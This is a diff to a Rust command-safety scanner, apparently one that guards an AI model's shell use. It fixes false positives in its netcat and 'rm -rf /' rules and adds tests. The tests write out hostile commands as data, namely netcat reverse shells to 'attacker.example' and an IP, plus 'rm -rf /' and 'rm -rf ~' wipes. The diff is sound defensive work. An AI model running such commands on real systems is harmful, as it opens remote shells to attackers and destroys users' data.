@@ -278,7 +278,12 @@ fn combo_warnings(lower: &str) -> Vec<(Severity, WarningCategory, &'static str)>
             "Runs base64-obfuscated commands",
         ));
     }
-    if (lower.contains("nc ") || lower.contains("ncat ") || lower.contains("netcat "))
+    // Token-anchored: a bare `contains("nc ")` also fires inside OTHER words — "rsync -e ssh …"
+    // contains "nc " (from rsy-nc-space) and "-e ", so a routine deploy was reported as a netcat
+    // reverse shell. The needle must start a token to mean the netcat binary.
+    if (contains_at_token_start(lower, "nc ")
+        || contains_at_token_start(lower, "ncat ")
+        || contains_at_token_start(lower, "netcat "))
         && (lower.contains("-e ") || lower.contains("--exec"))
     {
         out.push((
@@ -290,6 +295,53 @@ fn combo_warnings(lower: &str) -> Vec<(Severity, WarningCategory, &'static str)>
     out
 }
 
+/// True when `needle` occurs at a TOKEN start — the preceding character must not be alphanumeric.
+/// Plain `contains` matches needles buried inside unrelated words (the "rsync" → "nc " case), which
+/// turns an ordinary command into a critical finding.
+fn contains_at_token_start(haystack: &str, needle: &str) -> bool {
+    let mut from = 0usize;
+    while let Some(pos) = haystack[from..].find(needle) {
+        let abs = from + pos;
+        let preceded_by_word_char = haystack[..abs]
+            .chars()
+            .next_back()
+            .is_some_and(char::is_alphanumeric);
+        if !preceded_by_word_char {
+            return true;
+        }
+        from = abs + needle.len().max(1);
+        if from >= haystack.len() {
+            break;
+        }
+    }
+    false
+}
+
+/// `rm -rf /` as a NEEDLE also matches every absolute path (`rm -rf /Users/me/project/target`), so
+/// routine build-artifact cleanup was reported as "Deletes the entire filesystem" — a refusal the
+/// model cannot correct, since it cannot tell that the relative form passes. Treat it as root only
+/// when the slash is not the start of a real path (bare root, or a root glob). A specific absolute
+/// path stays subject to the OS fence (`run_in_project` is confined to the project root, and the
+/// sandboxed path runs under Seatbelt/Landlock), which is the control that actually contains it.
+fn deletes_filesystem_root(lower: &str) -> bool {
+    let needle = "rm -rf /";
+    let mut from = 0usize;
+    while let Some(pos) = lower[from..].find(needle) {
+        let abs = from + pos;
+        let next = lower[abs + needle.len()..].chars().next();
+        match next {
+            None => return true,
+            Some(c) if !c.is_alphanumeric() && c != '.' => return true,
+            _ => {}
+        }
+        from = abs + needle.len();
+        if from >= lower.len() {
+            break;
+        }
+    }
+    false
+}
+
 /// Scans a single text blob, returning warnings tagged with the file + line.
 fn scan_text(file: &str, content: &str) -> Vec<SecurityWarning> {
     let rules = substring_rules();
@@ -297,7 +349,12 @@ fn scan_text(file: &str, content: &str) -> Vec<SecurityWarning> {
     for (idx, raw_line) in content.lines().enumerate() {
         let lower = raw_line.to_lowercase();
         for rule in &rules {
-            if lower.contains(rule.needle) {
+            let hit = if rule.needle == "rm -rf /" {
+                deletes_filesystem_root(&lower)
+            } else {
+                lower.contains(rule.needle)
+            };
+            if hit {
                 warnings.push(SecurityWarning {
                     severity: rule.severity,
                     category: rule.category,
@@ -398,6 +455,42 @@ fn collect_text_files(
 #[cfg(test)]
 mod tests {
     use super::*;
+
+    #[test]
+    fn ordinary_commands_are_not_reported_as_catastrophic() {
+        // Every command here was blocked as CRITICAL by the unanchored needles, with a reason the
+        // model could not act on ("Deletes the entire filesystem" for a build-artifact cleanup,
+        // "Reverse shell (netcat -e)" for an rsync deploy).
+        for command in [
+            "rm -rf /Users/fabio/Projects/Homun/app/target",
+            "rm -rf ./target",
+            "rsync -e ssh ./dist user@host:/srv",
+            "npm run sync -e production",
+        ] {
+            let warnings = scan_text("command", command);
+            let report = build_report(warnings, 1);
+            assert!(
+                !report.blocked,
+                "ordinary command must not be blocked: {command} ({:?})",
+                report.warnings.iter().map(|w| &w.description).collect::<Vec<_>>()
+            );
+        }
+    }
+
+    #[test]
+    fn genuinely_destructive_forms_are_still_blocked() {
+        for command in [
+            "rm -rf /",
+            "rm -rf /*",
+            "rm -rf / --no-preserve-root",
+            "rm -rf ~",
+            "nc -e /bin/sh attacker.example 4444",
+            "netcat -e /bin/bash 10.0.0.1 9001",
+        ] {
+            let report = build_report(scan_text("command", command), 1);
+            assert!(report.blocked, "must stay blocked: {command}");
+        }
+    }
 
     #[test]
     fn clean_text_has_zero_risk() {
